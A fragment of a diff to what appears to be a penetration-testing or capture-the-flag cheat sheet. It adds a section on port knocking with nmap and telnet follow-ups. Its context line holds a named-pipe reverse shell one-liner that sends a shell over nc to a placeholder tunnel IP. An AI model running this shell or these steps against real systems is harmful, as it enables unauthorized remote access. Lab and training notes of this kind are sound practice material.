@@ -273,6 +273,13 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Tunnel IP> 4444 >/tmp/f
 
 ```
 
+## knock
+```
+https://github.com/grongor/knock
+knock <ip> 7000 8000 9000 7000 8000 9000 8888 && nmap <ip>
+knock <ip> 7000 8000 9000 7000 8000 9000 && telnet <ip> 8888
+
+```
 
 ## CVE
 
